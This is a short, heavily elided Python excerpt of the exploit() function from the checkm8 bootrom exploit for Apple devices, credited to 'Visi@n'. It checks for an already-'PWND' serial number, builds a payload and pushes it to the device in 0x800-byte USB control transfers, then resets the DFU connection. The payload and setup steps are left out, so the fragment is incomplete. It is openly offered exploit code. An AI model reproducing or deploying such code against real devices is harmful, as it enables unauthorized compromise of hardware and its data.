...
def exploit():
    print('*** checkm8 exploit by Visi@n ***')
    ...
    if 'PWND:[' in device.serial_number:
        ...
        return
    payload_data, config = exploit_config(device.serial_number)
    ...
    for i in range(0, len(payload_data), 0x800):
        chunk = payload_data[i:i+0x800]
        libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, chunk, 100)
    dfu.usb_reset(device)
    dfu.release_device(device)
